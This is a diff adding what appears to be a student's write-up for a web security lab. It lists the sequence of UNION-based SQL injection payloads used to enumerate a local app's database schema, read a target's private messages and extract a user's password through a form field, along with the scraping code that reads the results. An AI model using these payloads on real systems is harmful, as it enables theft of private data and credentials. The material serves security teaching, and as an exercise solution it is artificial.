@@ -1,0 +1,54 @@
+Ex1.1:
+
+The idea to get the message form james bond is to do SQL injections. 
+To do so, we need to request the server the data. 
+For that, we use : http://0.0.0.0:5001/messages?id='union select 1,mail,3,message from contact_messages where mail='james@bond.mi5' and '1' = '1'
+
+The iterations to find this url are:
+attack_iterations = [
+    "1' --",
+    "or id='2'",
+    "union select 1,2",
+    "union select 1,2,3",
+    "union select 1,2,3,4", # author is 2nd column, message is 4th column
+    "union select 1,2,3,4 from information_schema.tables where 1=1",
+    "union select 1,table_name,3,4 from information_schema.tables where 1=1", # table: contact_messages
+    "union select 1,column_name,3,4 from information_schema.columns where table_name='contact_messages'", # id, name, mail, message
+    "union select 1,mail,3,message from contact_messages where 1=1",
+    f"union select 1,mail,3,message from contact_messages where mail='{BONDS_EMAIL}'",
+]
+
+
+In this SQL injection, we search in the database [1,mail,3,message] because we know that 1 is the id,the second column is the author, the third is
+the mail and the fourth is the message. 
+
+When it's done, we use beautiful soup in this url to extract the message and print it in the cmd. By inspecting the website, we know that the message
+is contain in a container blockquote so we use the bs4 function : soup.findAll("blockquote", class_="blockquote")) to have the message.
+
+
+Ex1.2
+
+The idea is the same but now, the iterations are:
+
+
+attack_iterations = [
+    'or 1=1',
+    'union select 1, 2 from information_schema.tables',
+    'union select 1, table_name from information_schema.tables',
+    'union select column_name, table_name from information_schema.columns where table_name like \'users\'',
+    'union select \'Inspector Derrick\\\'s password is\', users.password from users where users.name like \'inspector_derrick\''
+]
+
+As we're requesting in a form, we need to deal with the form structure so :
+
+form = f'{attack_prefix}{attack_iterations[-1]}{attack_suffix}'
+form_data = {
+    'name': form
+}
+
+soup = post_html_soup(f'{DOMAIN}users', form_data)
+
+As before, by inspecting the webpage, we know that the message is contain in .col-md-10.col-md-offset-1
+listgroup = soup.select_one('.list-group')
+content = soup.select_one('.col-md-10.col-md-offset-1')
+then, we just need to print the password contain in listgroup
